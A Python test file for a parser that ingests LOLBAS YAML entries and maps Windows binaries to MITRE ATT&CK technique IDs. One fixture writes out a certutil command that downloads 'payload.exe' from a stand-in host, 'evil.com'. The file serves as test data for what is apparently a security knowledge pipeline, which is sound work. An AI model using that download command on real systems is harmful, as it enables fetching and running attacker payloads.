"""Tests for LOLBAS YAML parsing."""

from pathlib import Path

import yaml

from src.ingest.lolbas import parse_lolbas


def _write_lolbas(tmp_path: Path, name: str, data: dict) -> Path:
    d = tmp_path / "lolbas"
    d.mkdir(exist_ok=True)
    fp = d / f"{name}.yml"
    fp.write_text(yaml.dump(data))
    return d


class TestParseLolbas:
    def test_basic_parsing(self, tmp_path):
        d = _write_lolbas(tmp_path, "Certutil", {
            "Name": "Certutil.exe",
            "Description": "Certificate utility",
            "Commands": [
                {"Command": "certutil -urlcache -split -f http://evil.com/payload.exe",
                 "Description": "Download file", "MitreID": "T1105"},
            ],
        })
        docs = parse_lolbas(d)
        assert len(docs) == 1
        assert docs[0]["metadata"]["tool"] == "Certutil.exe"
        assert docs[0]["metadata"]["attack_id"] == "T1105"
        assert docs[0]["metadata"]["platform"] == "Windows"
        assert "Certutil.exe" in docs[0]["text"]

    def test_multiple_commands(self, tmp_path):
        d = _write_lolbas(tmp_path, "Certutil", {
            "Name": "Certutil.exe",
            "Commands": [
                {"Description": "Download", "MitreID": "T1105", "Command": "cmd1"},
                {"Description": "Encode", "MitreID": "T1140", "Command": "cmd2"},
            ],
        })
        docs = parse_lolbas(d)
        assert len(docs) == 2
        ids = {d["metadata"]["attack_id"] for d in docs}
        assert ids == {"T1105", "T1140"}

    def test_deduplicates_same_tool_technique(self, tmp_path):
        d = _write_lolbas(tmp_path, "Certutil", {
            "Name": "Certutil.exe",
            "Commands": [
                {"Description": "Download 1", "MitreID": "T1105", "Command": "cmd1"},
                {"Description": "Download 2", "MitreID": "T1105", "Command": "cmd2"},
            ],
        })
        docs = parse_lolbas(d)
        assert len(docs) == 1  # deduped by tool+technique

    def test_skips_missing_mitre_id(self, tmp_path):
        d = _write_lolbas(tmp_path, "Tool", {
            "Name": "Tool.exe",
            "Commands": [{"Description": "thing", "Command": "cmd"}],
        })
        docs = parse_lolbas(d)
        assert len(docs) == 0

    def test_empty_dir(self, tmp_path):
        d = tmp_path / "lolbas"
        d.mkdir()
        assert parse_lolbas(d) == []

    def test_nonexistent_dir(self, tmp_path):
        assert parse_lolbas(tmp_path / "nonexistent") == []

    def test_invalid_yaml_skipped(self, tmp_path):
        d = tmp_path / "lolbas"
        d.mkdir()
        (d / "bad.yml").write_text("not: [valid: yaml: {")
        docs = parse_lolbas(d)
        assert len(docs) == 0
